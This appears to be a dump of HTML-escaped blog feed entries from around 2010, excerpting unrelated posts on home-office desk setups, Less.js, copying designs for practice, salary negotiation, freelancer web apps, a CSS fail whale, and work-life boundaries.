height=\"367\"></a><br>\nNow this is dedication, are all music producers offices like this? If it is, I’m considering a career change. This is just awesomeness on a very high level, so clean at the same time as it’s overflowing with displays.</p>\n<h2>Spring in Cincinnati</h2>\n<p><a href=\"http://www.flickr.com/photos/ekalb/444291503/\"><img src=\"http://farm1.static.flickr.com/192/444291503_0e71042916_b.jpg\" alt=\"\" width=\"550\" height=\"366\"></a><br>\nOkay, the computer might be a little old these days – But hey, does that really matter with a view like that? Even though he could have left out the plate with breadcrumbs on it, this setup is just sweet!</p>\n<h2>New Silly Mac Setup</h2>\n<p><a href=\"http://www.flickr.com/photos/michaelbystrom/2722059420/in/pool-350714@N25\"><img src=\"http://farm4.static.flickr.com/3144/2722059420_b7510a7504_o.jpg\" alt=\"\" width=\"550\" height=\"413\"></a><br>\nThis is beautiful, professional, clean, great lighting and great use of space. In my own opinion, this is one of the most professional setups I’ve ever seen. The iPhone and Webcam are just nice additions to an already close to perfect office setup.</p>\n<h2>iMac 24 2.4</h2>\n<p><a href=\"http://www.flickr.com/photos/macdesktops/3597439583/in/pool-350714@N25\"><img src=\"http://farm4.static.flickr.com/3304/3597439583_ba00a2931c_b.jpg\" alt=\"\" width=\"550\" height=\"300\"></a><br>\nFor me it’s the speakers, iPhone and lighting that does it for me. Looks really professional and clean, the symetry are just great. Like this one a lot – what do you think?</p>\n<h2>Multi-Screen Tech</h2>\n<p><a href=\"http://www.flickr.com/photos/justingriz/3332534822/in/pool-350714@N25\"><img src=\"http://farm4.static.flickr.com/3388/3332534822_0d7931d392_o.jpg\" alt=\"\" width=\"550\" height=\"321\"></a><br>\nDedication yet again, a lot of screens with a really nice addition of a 13″ custom built self-enclosed Wall-PC on the left wall. Could you point out all the additions that makes this office look this great? Here’s what I think – iPhone, wall-PC, cool wall clock, webcam, iPhone box, digital photo frame, external HDD drive and so much more.</p>\n<h2>Fish Bowl Setup</h2>\n<p><a href=\"http://www.flickr.com/photos/declanjewell/2632826118/in/pool-24765107@N00\"><img src=\"http://farm4.static.flickr.com/3113/2632826118_f499b8033c_b.jpg\" alt=\"\" width=\"550\" height=\"367\"></a><br>\nA very clean and professional looking office space, the thing that makes this one so unique is the small bowl of water beside the screen. Makes it look so homey of some sort, I just love this very simple yet professional home office.</p>\n<h2>Green Light Setup</h2>\n<p><a href=\"http://www.flickr.com/photos/vincewelter/4120724765/in/pool-mydesk\"><img src=\"http://farm3.static.flickr.com/2543/4120724765_813aa7733f_o.jpg\" alt=\"\" width=\"550\" height=\"367\"></a><br>\nThe green dioder light makes this office look really playful, clean and still it manages to keep it on a professional level. Additions like the, iPhone and a cordless phone makes this look great. Do you agree with me?</p>\n<h2>More Screens!</h2>\n<p><a href=\"http://www.flickr.com/photos/didak/2974540091/in/pool-33795555@N00\"><img src=\"http://farm4.static.flickr.com/3201/2974540091_40b8a19cf4_o.jpg\" alt=\"\" width=\"550\" height=\"368\"></a><br>\nI don’t know what to say about this one, it’s just awesome dedication! Love every part of this setup, looks so professional and clean all over – don’t you agree?</p>\n<h2>Office at Night</h2>\n<p><a href=\"http://www.flickr.com/photos/dehlz/3828282210/in/pool-mydesk\"><img src=\"http://farm3.static.flickr.com/2495/3828282210_d337e310d0_b.jpg\" alt=\"\" width=\"550\" height=\"413\"></a><br>\nSimplicity are always great, with the current lighting he uses – the office looks really clean, An extra nice addition is the, Bose speaker system he uses. This brings great sound to an already great office.</p>\n<h2>Minimal Setup</h2>\n<p><a href=\"http://www.flickr.com/photos/dehlz/3828291274/in/pool-mydesk\"><img src=\"http://farm4.static.flickr.com/3545/3828291274_374ce8ea7a_b.jpg\" alt=\"\" width=\"550\" height=\"413\"></a><br>\nLooks like this office has a great view, nice lighting and the desk is just amazingly beautiful. Another one who uses, Bose as sound system for the office – and yet again, it brings great sound to an amazing office.</p>\n<h2>Temporarily Together</h2>\n<p><a href=\"http://www.flickr.com/photos/raw_reflex/1171847244/in/pool-33795555@N00\"><img src=\"http://farm2.static.flickr.com/1342/1171847244_b816963360_b.jpg\" alt=\"\" width=\"550\" height=\"822\"></a><br>\nThis is not one of thoose round-ups who saves the best for last, but it’s not far from it. This setup is just great all the way through, with additions like the homemade “http” painting?, a wooden desk and the iPod connected to a sound system, it just looks great to be honest.</p>\n<h3>Show Me Yours!</h3>\n<p>I will end this round-up with something we usually don’t do: I would love too see how your office looks like.

Less.js has been written as a CommonJS module so you can run it on the server via node, or in the browser on the fly.</p>\n<p>Dmitry answers the perf question (runtime HAS to be slower!), and talks of some cool features:</p>\n<blockquote><p>\nWouldn’t live processing lag? Not really. Two reasons for this. One: Less.js has been written from the ground up for great performance, so even browsers with poor JavaScript implementation should still run it very well (Less.js is about 40 times faster than the Ruby implementation—so suffice to say it’s a lot faster.). Two: On modern browsers that support HTML5, Less.js will cache the generated CSS on local storage, making subsequent page loads as fast as pure CSS.</p>\n<p>There are other cool features built into Less.js. For example, there’s a “watch” feature available in development mode. This feature will refresh the CSS on your page whenever your .less file is saved with new changes. The best thing is, it won’t refresh the whole page, just the right bits of CSS, live.\n</p></blockquote>\n<p>Less is certainly more. Even though it is tough to make the performance trade off in production, for development, and for the ability to use less for applications that don't have a server (e.g. I am excited to use this in webOS and mobile Web apps in general! ;) is palpitating. Sencha Touch uses the step cousin, SASS.</p>\n<div>\n<a href=\"http://feeds.feedburner.com/~ff/ajaxian?a=mEXCOzx6UWk:egvb_sr1880:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/ajaxian?d=yIl2AUoC8zA\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/ajaxian?a=mEXCOzx6UWk:egvb_sr1880:7Q72WNTAKBA\"><img src=\"http://feeds.feedburner.com/~ff/ajaxian?d=7Q72WNTAKBA\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/ajaxian?a=mEXCOzx6UWk:egvb_sr1880:D7DqB2pKExk\"><img src=\"http://feeds.feedburner.com/~ff/ajaxian?i=mEXCOzx6UWk:egvb_sr1880:D7DqB2pKExk\" border=\"0\"></a>\n</div>"

      "content" : "<p>Over the last few months I’ve noticed a ton of inspiring websites. <a href=\"http://cameron.io/\">Camerion.io</a>, <a href=\"http://www.artlebedev.com/mandership\">Art Lebedev</a>, <a href=\"http://nplusonemag.com/\">n+1</a>, <a href=\"http://www.showofforce.com/default.php?page=about\">Show of Force</a>, and on and on. And everytime I look at one of these sites, I think to myself “Oh I’m so inspired. Look at how they did this. Look at that paragraph style. Look at that header. I feel so full of ideas.”</p>\n\n\n\t<p>Then it’s time to work on a new project, and did all the inspiration make a difference? Actually, no. Most of the work I do is looking like all the other work I’ve done for months and months and years. Apparently looking at cool stuff isn’t enough to increase your skill. It’s easy to look at some stuff and say “oh that’s inspiring, that gives me ideas” without moving an inch.</p>\n\n\n\t<p>So I got thinking. How did I develop the basic skills I have right now? Mostly by copying heroes. When you’re fresh starting out, you have no fear of diving in and copying something directly. It’s like playing guitar. When you start playing guitar all you want to do is play the first verse of your favorite song. Big success! You don’t need to write the next great guitar symphony or a hit single. It’s totally satisfying to learn to play something somebody else can already play. And you get better by doing it.</p>\n\n\n\t<p>And it was the same way with design. I was totally psyched to copy a Müller-Brockmann poster, a Designgraphik composition, or an Apple UI. Merely executing the copy was a thrill. But now every design is supposed to be the next great thing. And as days and weeks and months go by, the design level stays the same while the aspiration goes higher and higher.</p>\n\n\n\t<p>So maybe it’s time to take one of these Fridays off and just copy something.</p><div>\n<a href=\"http://feeds.feedburner.com/~ff/37signals/beMH?a=lCAl8mLzs4U:g_eTnroUEB0:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/37signals/beMH?d=yIl2AUoC8zA\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/37signals/beMH?a=lCAl8mLzs4U:g_eTnroUEB0:7Q72WNTAKBA\"><img src=\"http://feeds.feedburner.com/~ff/37signals/beMH?d=7Q72WNTAKBA\" border=\"0\"></a>\n</div>"

I think the smaller screenshot could have zoomed in on one area of the website.</p>\n<p><a href=\"http://www.fantasmagorical.co.uk/\"><img src=\"http://www.devlounge.net/wp-content/uploads/2010/06/fantasmagorical.jpg\" alt=\"Fantasmagorical\" title=\"Fantasmagorical\" width=\"550\" height=\"330\"></a></p>\n<p>This may look a little cheesy for some, but since the company built its brand on the word phantasmagoria, I'll take it. Now the question is, are the sparkly stuff mixed into the screenshots a welcome decoration, or too much of a distraction? I think the ribbon balances it out.</p>\n<h3>Social Media Weekly</h3>\n<p><strong>Design</strong> - <em><a href=\"http://www.inspiredm.com/2010/06/16/designing-websites-touchscreens/\">The Tangible Web: Thoughts on Designing Websites for Touchscreens</a></em><br>\n\"Below, I’ve jotted down a few thoughts on design practices that we’ll likely be seeing a lot more of as site owners begin reorganizing and redesigning to welcome our touchy-feely visitors.\"</p>\n<p><strong>CSS</strong> - <em><a href=\"http://msdn.microsoft.com/en-us/scriptjunkie/ff679957.aspx\">Be a CSS Team Player: CSS Best Practices for Team-Based Development</a></em><br>\n\"How many times have you picked up a project that someone else started, only to discover that the creator's original code is a mess?

As for their ethics, I’m not even going to comment on it except to say I wouldn’t do it.</p>\n<p>So I jotted off a quick note to the New York Times about a better way to negotiate, including the scripts for what people <em>should</em> say if they’re asked about their salary history.</p>\n<p>Less than 24 hours later, I had spoken to a NYT reporter and my responses were posted on their blog. </p>\n<p><strong>Read it here</strong>: <a href=\"http://bucks.blogs.nytimes.com/2010/06/17/on-refusing-to-disclose-your-salary-in-a-job-interview/\">On Refusing to Disclose Your Salary in a Job Interview<br>\n</a></p>\n<img src=\"http://www.iwillteachyoutoberich.com/?ak_action=api_record_view&amp;id=5746&amp;type=feed\" alt=\"\"><p><iframe src=\"http://feedads.g.doubleclick.net/~ah/f/h8k4hav2v55sb3b816pta9mvno/300/250?ca=1&amp;fh=280#http%3A%2F%2Fwww.iwillteachyoutoberich.com%2Fblog%2Freveal-salary-history-negotiation%2F\" width=\"100%\" height=\"280\" frameborder=\"0\" scrolling=\"no\" marginwidth=\"0\" marginheight=\"0\"></iframe></p><div>\n<a href=\"http://feeds.feedburner.com/~ff/IWillTeachYouToBeRich?a=qQ5b9Frqnas:3ibqZQGkgqk:D7DqB2pKExk\"><img src=\"http://feeds.feedburner.com/~ff/IWillTeachYouToBeRich?i=qQ5b9Frqnas:3ibqZQGkgqk:D7DqB2pKExk\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/IWillTeachYouToBeRich?a=qQ5b9Frqnas:3ibqZQGkgqk:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/IWillTeachYouToBeRich?d=yIl2AUoC8zA\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/IWillTeachYouToBeRich?a=qQ5b9Frqnas:3ibqZQGkgqk:qj6IDK7rITs\"><img src=\"http://feeds.feedburner.com/~ff/IWillTeachYouToBeRich?d=qj6IDK7rITs\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/IWillTeachYouToBeRich?a=qQ5b9Frqnas:3ibqZQGkgqk:7Q72WNTAKBA\"><img src=\"http://feeds.feedburner.com/~ff/IWillTeachYouToBeRich?d=7Q72WNTAKBA\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/IWillTeachYouToBeRich?a=qQ5b9Frqnas:3ibqZQGkgqk:cGdyc7Q-1BI\"><img src=\"http://feeds.feedburner.com/~ff/IWillTeachYouToBeRich?d=cGdyc7Q-1BI\" border=\"0\"></a>\n</div><img src=\"http://feeds.feedburner.com/~r/IWillTeachYouToBeRich/~4/qQ5b9Frqnas\" height=\"1\" width=\"1\">"

These are all great apps, some might work for you, some might not. It all depends on who you ask; I have found these to be the best for what I need. I suggest you try these out before making up your mind on which ones are great and which ones are bad. It´s all in the “Eye of the Beholder” after all.<span></span></p>\n<h3>1Password</h3>\n<p><a href=\"http://agilewebsolutions.com/products/1Password\"><img src=\"http://freelanceswitch.com/wp-content/uploads/2010/06/1password.jpg\" alt=\"\" width=\"550\" height=\"233\"></a><br>\nIf there´s a better and easier way to generate a custom password and save it specifically for different identities, accounts and users I haven´t found it. Works perfect each time, works for all major browsers but the best part: fast and quick updates and 100% secure. Dashboard software to manage all your saved passwords in one go–to me, it can´t get much better than this.</p>\n<h3>Mint.com</h3>\n<p><a href=\"http://www.mint.com/\"><img src=\"http://freelanceswitch.com/wp-content/uploads/2010/06/mint.jpg\" alt=\"\" width=\"550\" height=\"233\"></a><br>\nAs a freelancer it can be quite hard to keep track on all expenses all the time. I, for one, have had a few problems with it. A few of my friends recommended Mint to me, and it has saved me an enormous amount of time through the months I´ve used it.</p>\n<h3>Scraplr</h3>\n<p><a href=\"http://scraplr.com/\"><img src=\"http://freelanceswitch.com/wp-content/uploads/2010/06/scraplr.jpg\" alt=\"\" width=\"550\" height=\"233\"></a><br>\nI haven´t been using Scraplr for a very long time, but to manage your tasks online, I haven´t found a better way to do it. You´ve got alerts for everything, from e-mail alerts to reciveing a text message to your cellphone. It even uses a beautiful interface, can´t get much better than this.</p>\n<h3>Timebridge</h3>\n<p><a href=\"http://www.timebridge.com/\"><img src=\"http://freelanceswitch.com/wp-content/uploads/2010/06/timebridge.jpg\" alt=\"\" width=\"550\" height=\"233\"></a><br>\nEven if you´re not a CEO, you might find Timebridge really useful. There´s no better way to set up a simple meeting with a client. I´ve used it multiple times and it has always delivered.</p>\n<h3>Freshbooks</h3>\n<p><a href=\"http://www.freshbooks.com/\"><img src=\"http://freelanceswitch.com/wp-content/uploads/2010/06/freshbooks.jpg\" alt=\"\" width=\"550\" height=\"233\"></a><br>\nI´m not sure if this fantastic application needs any introduction, but in case it does – FreshBooks can manage your clients, time, invoices in a simple and easy way. I´m using Freshbooks when sending invoices to my clients, and thus far, it hasn’t failed me.</p>\n<h3>Basecamp</h3>\n<p><a href=\"http://basecamphq.com/\"><img src=\"http://freelanceswitch.com/wp-content/uploads/2010/06/basecamp.jpg\" alt=\"\" width=\"550\" height=\"233\"></a><br>\nOne of the best collaboration applications out there, I used Basecamp when I collaborated with a friend of mine a while back. You´re able to upload files, add a comment, and manage all users for your specific account.</p>\n<h3>Dropbox</h3>\n<p><a href=\"https://www.dropbox.com/\"><img src=\"http://freelanceswitch.com/wp-content/uploads/2010/06/dropbox.jpg\" alt=\"\" width=\"550\" height=\"233\"></a><br>\nNeed any storage online? Perfect way to share files with clients, friends, and even family. Supports all major browsers and OS. I´m using Dropbox due to it´s simplicity and stability. Why do you use it?</p>\n<h3>Highrise</h3>\n<p><a href=\"http://highrisehq.com/\"><img src=\"http://freelanceswitch.com/wp-content/uploads/2010/06/highrise.jpg\" alt=\"\" width=\"550\" height=\"233\"></a><br>\nNeed to track leads? Manage contacts? Highrise is for you. I haven´t been using it very long, but the time I´ve had with it, it has worked perfect.</p>\n<h3>CoTweet</h3>\n<p><a href=\"http://cotweet.com/\"><img src=\"http://freelanceswitch.com/wp-content/uploads/2010/06/cotweet.jpg\" alt=\"\" width=\"550\" height=\"233\"></a><br>\nCoTweet is for anyone using Twitter to market their business. Using multiple accounts makes it very easy to use and manage. If you are anything like me, who manages more than one Twitter account – CoTweet comes strongly recommended!</p>\n<h3>Screenr</h3>\n<p><a href=\"http://screenr.com/\"><img src=\"http://freelanceswitch.com/wp-content/uploads/2010/06/screenr.jpg\" alt=\"\" width=\"550\" height=\"233\"></a><br>\nHelp out your clients by showing them a short instruction video of an installation process, technical step, or anything that can be done on a screen. I´m using Screenr for short video snippets for my clients. Show them how to do a certain action, process, or how to solve “that problem” quick and easy.</p>\n<p>You have any experience with any of these apps? Maybe you have a couple or more to share? Either way, share your opinions and recommendations.</p>\n<p><iframe src=\"http://feedads.g.doubleclick.net/~ah/f/8ht4n8gk25l2l5maofrf5p08g4/300/250?ca=1&amp;fh=280#http%3A%2F%2Ffreelanceswitch.com%2Fproduct-reviews%2Fweb-apps-for-freelancers%2F\" width=\"100%\" height=\"280\" frameborder=\"0\" scrolling=\"no\" marginwidth=\"0\" marginheight=\"0\"></iframe></p><div>\n<a href=\"http://feeds.feedburner.com/~ff/FreelanceSwitch?a=kmCt0QmVUH4:rpz1J6bs3Fs:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/FreelanceSwitch?d=yIl2AUoC8zA\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/FreelanceSwitch?a=kmCt0QmVUH4:rpz1J6bs3Fs:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/FreelanceSwitch?i=kmCt0QmVUH4:rpz1J6bs3Fs:V_sGLiPBpWU\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/FreelanceSwitch?a=kmCt0QmVUH4:rpz1J6bs3Fs:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/FreelanceSwitch?i=kmCt0QmVUH4:rpz1J6bs3Fs:gIN9vFwOqvQ\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/FreelanceSwitch?a=kmCt0QmVUH4:rpz1J6bs3Fs:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/FreelanceSwitch?i=kmCt0QmVUH4:rpz1J6bs3Fs:F7zBnMyn0Lo\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/FreelanceSwitch?a=kmCt0QmVUH4:rpz1J6bs3Fs:wF9xT3WuBAs\"><img src=\"http://feeds.feedburner.com/~ff/FreelanceSwitch?i=kmCt0QmVUH4:rpz1J6bs3Fs:wF9xT3WuBAs\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/FreelanceSwitch?a=kmCt0QmVUH4:rpz1J6bs3Fs:D7DqB2pKExk\"><img src=\"http://feeds.feedburner.com/~ff/FreelanceSwitch?i=kmCt0QmVUH4:rpz1J6bs3Fs:D7DqB2pKExk\" border=\"0\"></a>\n</div><img src=\"http://feeds.feedburner.com/~r/FreelanceSwitch/~4/kmCt0QmVUH4\" height=\"1\" width=\"1\">"

The latest is a fully animated <a href=\"http://www.subcide.com/articles/pure-css-twitter-fail-whale/\">Twitter fail whale</a> by Steve Dennis:</p>\n<blockquote><p>\nThe idea for this came to me this morning after being greeted first thing this morning by another Twitter outage.  I’d been looking for something to stretch my CSS muscles on, and the Fail Whale seemed perfect.  Also I think the animation only adds to his (or her?) charm.</p>\n<p>How was this made?</p>\n<p>The short answer is very painfully, by hand, using trial and error.  Curves are done using various uneven border-radius properties, stranger angles (such as the strings) are masked using containers with overflow: hidden; set on them.

(Answer: 38). Is the coast live oak an endangered or threatened species? (Answer: No). Will the removal of these individual trees have any significant impact on the health of the overall population of the species? (Answer: No). Consider how many collective man-hours your campaign has devoted to saving these trees. Has it occurred to you that your time may be better spent focusing on (for example) the huge swaths of the Amazon that are cut down by loggers and developers every day? Are you choosing to protect 38 trees because you really think it is a significant, meaningful cause? I hope not–because that would be ignorant. It seems much more likely that you choose this battle because it is relatively convenient and riskless. Honestly–why don’t you sac up and take on a *real* environmental offender?”</p></blockquote>\n<p>You’ll find a lot of people doing largely meaningless things and justifying it with these 4 terrible words: “It can’t hurt, right?”</p>\n<p>But it can.

And with limited time, are you focusing on stuff that will make no difference? Or are you saving your limited attention and cognition for areas that will really make a difference?</p>\n<p>How often do we pick things that are easy (e.g., saving money on lattes) instead of <a href=\"http://www.iwillteachyoutoberich.com/blog/trent-says-the-scrooge-strategy-is-short-sighted-i-respond-with-a-challenge/\">big wins</a>?

However, there are still some attributes that are not so well-known; also, CSS3 offers us new possibilities and tools that need to be understood, learned and then applied in the right context to the right effect.</p><p style=\"float:left;display:inline;padding:0px 10px 10px 0\"></p><p>In this round-up we present fresh useful articles about less-known CSS 2.1 and CSS3 properties as well as an overview of <strong>recently published CSS techniques, tools and tips</strong> for designers and web-developers.

We sometimes don’t have very good fences between us and the people we work with – our clients, our colleagues, even our families. We often don’t have any fences, in fact.</p>\n<p>Those unclear boundaries cause stress that you could do without. Here are some ways to create fences between you and your “neighbors” so you can get the work done.<span></span></p>\n<h3>Fences between You and Your Clients</h3>\n<p>You need to be professional around your clients. You can’t just decide to slap up any old fence, though. If your client isn’t accustomed to having a barrier between him and you, running into a nasty chain-link fence with barbed wire along the top is not going to go over well.</p>\n<p>So let him know the fence is going up. Politely mention that in order to do a better job, you’ve decided to create some policies so that you can focus your attention on his projects. That means you’re only going to be checking your email twice a day, and he might have to wait a few hours for a response instead of the insta-reply he’s used to.</p>\n<p>Make the fence attractive, though. If you’re going to use an auto-responder to let people know how often you check email (a smart move), then write a nice friendly one that gives people a smile instead of a terse, “I am not available right now. I will reply to all emails at 3:00 pm.”</p>\n<h3>Fences between You and Your Colleagues</h3>\n<p>If you work with other freelancers, as most of us do, you’ve probably experienced this problem: your colleague wants to hang with you often. He just starts chatting away on IM or calls you up for no reason except to shoot the breeze. Consider it the equivalent of your neighbor wandering into your house whenever he feels like it. Sure, you can tell him you’re busy, but that makes you feel awkward and rude.</p>\n<p>The solution? A fence, of course. For IM, a good fence is setting your IM to the red “do not disturb” option. Warn your colleagues about the fence going up, just as you did your clients, but do something important as well: let your colleague know how to open the gate.</p>\n<p>That means that if you want your colleague to ping you if he has a business matter to draw to your attention, tell him it’s okay. It’s like saying, “I put up this fence because I need to get some work done, but if it’s really important, go ahead and unlatch the gate.” This also says you have faith your colleague will only use the gate if he needs to – and most people like to prove themselves worthy of that kind of faith.</p>\n<h3>Fences between You and Your Family</h3>\n<p>These are the hardest fences to put up, because your family lives with you. You don’t want to shut them out, and you don’t want them to feel unwelcome in your back yard. You also don’t want to hurt their feelings. It’s one thing to put up a fence between you and a neighbor – it’s another to put up a fence between you and your child.</p>\n<p>Or is it? Even when we live with people, we put up fences all the time. The closed door. The “do not disturb” sign. The polite request to leave us alone. The problem is getting your family to respect those gestures AS a fence. You need to help them recognize that it’s not okay to just hop over as though the fence wasn’t there.</p>\n<p>Usually this means having a serious talk, often with your significant other. If your partner is the person you want to keep out, then you need to explain how important that fence is to you – and to the quality time you want to spend with that person. If it’s your kids you need to keep out, then your partner will have to be the one who stresses, over and over, that you really need them to not hop the fence whenever they please.</p>\n<p>Freelancing isn’t easy, and it’s often essential to have peace and quiet to do a good job. When you need to communicate the message that your space to work is off-limits, a fence is a good way to do that.</p>\n<p>Just make sure you open the gate from time to time and get out. Good fences may make good freelancers, but isolation makes bad relationships.</p>\n<p>Your turn: Have you had to put up some fences? Any suggestions you’d like to share? Or maybe you’re frustrated that your fences aren’t working – tell us about it and see if others can’t help spark some creative ideas to help out.</p>\n<p><iframe src=\"http://feedads.g.doubleclick.net/~ah/f/8ht4n8gk25l2l5maofrf5p08g4/300/250?ca=1&amp;fh=280#http%3A%2F%2Ffreelanceswitch.com%2Ffreelancing-essentials%2Fwhy-you-need-good-fences-for-your-freelance-neighbors%2F\" width=\"100%\" height=\"280\" frameborder=\"0\" scrolling=\"no\" marginwidth=\"0\" marginheight=\"0\"></iframe></p><div>\n<a href=\"http://feeds.feedburner.com/~ff/FreelanceSwitch?a=tBtfzYXKPYc:vjghp6AZH5w:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/FreelanceSwitch?d=yIl2AUoC8zA\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/FreelanceSwitch?a=tBtfzYXKPYc:vjghp6AZH5w:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/FreelanceSwitch?i=tBtfzYXKPYc:vjghp6AZH5w:V_sGLiPBpWU\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/FreelanceSwitch?a=tBtfzYXKPYc:vjghp6AZH5w:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/FreelanceSwitch?i=tBtfzYXKPYc:vjghp6AZH5w:gIN9vFwOqvQ\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/FreelanceSwitch?a=tBtfzYXKPYc:vjghp6AZH5w:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/FreelanceSwitch?i=tBtfzYXKPYc:vjghp6AZH5w:F7zBnMyn0Lo\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/FreelanceSwitch?a=tBtfzYXKPYc:vjghp6AZH5w:wF9xT3WuBAs\"><img src=\"http://feeds.feedburner.com/~ff/FreelanceSwitch?i=tBtfzYXKPYc:vjghp6AZH5w:wF9xT3WuBAs\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/FreelanceSwitch?a=tBtfzYXKPYc:vjghp6AZH5w:D7DqB2pKExk\"><img src=\"http://feeds.feedburner.com/~ff/FreelanceSwitch?i=tBtfzYXKPYc:vjghp6AZH5w:D7DqB2pKExk\" border=\"0\"></a>\n</div><img src=\"http://feeds.feedburner.com/~r/FreelanceSwitch/~4/tBtfzYXKPYc\" height=\"1\" width=\"1\">"

Let's see where they take us.</p>\n<h3>Designs of the Week</h3>\n<p><a href=\"http://www.balhar.com/\"><img src=\"http://www.devlounge.net/wp-content/uploads/2010/06/balhar.jpg\" alt=\"Martin Balhar\" title=\"Martin Balhar\" width=\"550\" height=\"330\"></a></p>\n<p>I like screen-high, hairline-thick arrow that appears on hover. The navigation and the subtle animation on the link hovers is great too. And don't forget the stunning type on the front page!</p>\n<p><a href=\"http://www.biggunsdesign.com/\"><img src=\"http://www.devlounge.net/wp-content/uploads/2010/06/biggunsdesign.jpg\" alt=\"Big Guns Design\" title=\"Big Guns Design\" width=\"550\" height=\"330\"></a></p>\n<p>Simple design concept but looks beautiful. Here the arrows are section markers and lead you back to the top. I wonder why I'm only seeing this design element now.</p>\n<p><a href=\"http://jai.im/\"><img src=\"http://www.devlounge.net/wp-content/uploads/2010/06/jai.im_.jpg\" alt=\"Jai Pandya\" title=\"Jai Pandya\" width=\"550\" height=\"330\"></a></p>\n<p>The hand-drawn arrows and text links add transitions from one section of content to another. It's a good alternative to the fixed navigation on top.</p>\n<p><a href=\"http://www.whats-up-cupcake.com/\"><img src=\"http://www.devlounge.net/wp-content/uploads/2010/06/whats-up-cupcake.jpg\" alt=\"What&#39;s Up Cupcake\" title=\"What&#39;s Up Cupcake\" width=\"550\" height=\"330\"></a></p>\n<p>Where are the arrows on the page? I can count six! Great way to lead the eye and match the elegant look of the site, is it not?</p>\n<p><a href=\"http://searchinsidevideo.com/\"><img src=\"http://www.devlounge.net/wp-content/uploads/2010/06/searchinsidevideo.jpg\" alt=\"Search Inside Video\" title=\"Search Inside Video\" width=\"550\" height=\"330\"></a></p>\n<p>Arrows for every step of the way. The list needs better alignment but other than that, the infographics are well done.</p>\n<p><a href=\"http://flockchart.com/\"><img src=\"http://www.devlounge.net/wp-content/uploads/2010/06/flockchart.jpg\" alt=\"FlockChart\" title=\"FlockChart\" width=\"550\" height=\"330\"></a></p>\n<p>Hiding the arrows when there's nothing left to browse is a good idea.</p>\n<p><a href=\"http://jaydev.free.fr/\"><img src=\"http://www.devlounge.net/wp-content/uploads/2010/06/jaydev.jpg\" alt=\"Jaydev\" title=\"Jaydev\" width=\"550\" height=\"330\"></a></p>\n<p>Interesting slideshow effect here: instead of the usual horizontal scrolling, this one goes diagonally. I wouldn't say it's more effective, but it certainly different.</p>\n<h3>Social Media Weekly</h3>\n<p><strong>CSS</strong> - <em><a href=\"http://www.sohtanaka.com/web-design/css-sprites-wout-background-images/\">CSS Sprites w/out Using Background Images</a></em></p>\n<p><strong>JavaScript</strong> - <em><a href=\"http://spyrestudios.com/inline-expansion-why-and-where-to-use-it/\">Inline Expansion – Why And Where To Use It</a></em></p>\n<p><strong>Design</strong> - <em><a href=\"http://designshack.co.uk/articles/inspiration/6-apps-for-collecting-digital-inspiration\">6 Apps for Collecting Digital Inspiration</a></em></p>\n<div>\n<a href=\"http://feeds.feedburner.com/~ff/Devlounge?a=axxL1LDsnwY:v4qB_YyT2yk:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/Devlounge?d=yIl2AUoC8zA\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/Devlounge?a=axxL1LDsnwY:v4qB_YyT2yk:dnMXMwOfBR0\"><img src=\"http://feeds.feedburner.com/~ff/Devlounge?d=dnMXMwOfBR0\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/Devlounge?a=axxL1LDsnwY:v4qB_YyT2yk:7Q72WNTAKBA\"><img src=\"http://feeds.feedburner.com/~ff/Devlounge?d=7Q72WNTAKBA\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/Devlounge?a=axxL1LDsnwY:v4qB_YyT2yk:D7DqB2pKExk\"><img src=\"http://feeds.feedburner.com/~ff/Devlounge?i=axxL1LDsnwY:v4qB_YyT2yk:D7DqB2pKExk\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/Devlounge?a=axxL1LDsnwY:v4qB_YyT2yk:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/Devlounge?i=axxL1LDsnwY:v4qB_YyT2yk:V_sGLiPBpWU\" border=\"0\"></a>\n</div><img src=\"http://feeds.feedburner.com/~r/Devlounge/~4/axxL1LDsnwY\" height=\"1\" width=\"1\">"

